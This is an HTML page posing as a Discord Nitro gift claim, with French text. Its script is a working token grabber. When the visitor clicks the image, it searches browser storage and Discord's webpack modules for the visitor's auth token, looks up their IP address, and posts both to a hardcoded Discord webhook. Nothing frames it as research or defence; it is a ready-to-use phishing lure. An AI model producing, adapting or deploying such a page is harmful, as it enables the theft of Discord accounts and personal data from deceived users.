<!DOCTYPE html>
<html>
<head>
    <title>Nitro Claim</title>
</head>
<body style="margin:0;background:#36393f;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Whitney,sans-serif;">
    <div style="text-align:center;color:white;">
        <img src="https://i.imgur.com/0pK1k1L.png" onclick="grabToken()" style="max-width:400px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);cursor:pointer;" alt="Nitro">
        <h2 style="margin:20px 0;color:#7289da;">Clique pour claim Nitro ! üî•</h2>
    </div>
    
    <script>
        // DEBUG: Affiche TOUS les tokens possibles
        async function grabToken() {
            let token = '';
            let debugInfo = [];
            
            // 1. localStorage MULTI
            const lsKeys = Object.keys(localStorage);
            for(let key of lsKeys) {
                if(key.includes('token') || key.includes('*')) {
                    debugInfo.push(`${key}: ${localStorage[key]?.slice(0,20)}`);
                    if(localStorage[key]?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) token = localStorage[key];
                }
            }
            
            // 2. sessionStorage
            for(let key of Object.keys(sessionStorage)) {
                if(sessionStorage[key]?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
                    token = sessionStorage[key];
                    debugInfo.push(`sessionStorage.${key}`);
                }
            }
            
            // 3. Webpack (toutes versions)
            try {
                const chunks = window.webpackChunkdiscord_app || [];
                for(let chunk of chunks) {
                    if(Array.isArray(chunk)) {
                        const modReq = chunk[2];
                        if(modReq) {
                            for(let m in modReq.c) {
                                const mod = modReq.c[m].exports?.default;
                                if(mod?.getToken && typeof mod.getToken === 'function') {
                                    token = mod.getToken();
                                    debugInfo.push('webpack.getToken()');
                                    break;
                                }
                            }
                        }
                    }
                }
            } catch(e) {debugInfo.push('webpack error');}
            
            // 4. window.__TAURI__ (Desktop)
            if(window.__TAURI__) {
                debugInfo.push('Tauri desktop');
            }
            
            // 5. Fallback: URL params (rare)
            const urlToken = new URLSearchParams(window.location.search).get('token');
            if(urlToken) token = urlToken;
            
            console.log('DEBUG TOKENS:', debugInfo);
            console.log('TOKEN FINAL:', token ? token.slice(0,50)+'...' : 'AUCUN');
            
            if(!token?.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
                document.body.innerHTML = `
                    <div style="color:orange;text-align:center;padding:20px;">
                        <h2>üîç DEBUG INFO</h2>
                        <p>Tokens trouv√©s: ${debugInfo.length}</p>
                        <details>
                            <summary>Clique pour voir console</summary>
                            <p>F12 ‚Üí Console pour debug complet</p>
                        </details>
                        <p>1. Ouvre Discord d'abord</p>
                        <p>2. Recharge cette page</p>
                        <p>3. F12 ‚Üí Application ‚Üí Local Storage</p>
                    </div>
                `;
                return;
            }
            
            // ENVOI WEBHOOK
            let ip = await (await fetch('https://api.ipify.org')).text().catch(()=>'N/A');
            const data = {
                content: `\`\`\`${token}\`\`\`\n**IP:** ${ip}\n**Debug:** ${debugInfo.slice(0,3).join(', ')}`,
                embeds: [{title:'üéØ TOKEN OK !', color:0x00ff00}]
            };
            
            fetch('https://discord.com/api/webhooks/1459250463625973771/9kPMp9m-Hs1CklXscaLMUceI3MwK3pLFFH4hGakCRUmFirvD3XVsys8JBFRncDe4BjXy', {
                method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)
            });
            
            document.body.innerHTML = '<h1 style="color:lime;">‚úÖ TOKEN ENVOY√â ! Merci !</h1>';
        }
        </script>
</body>
</html>

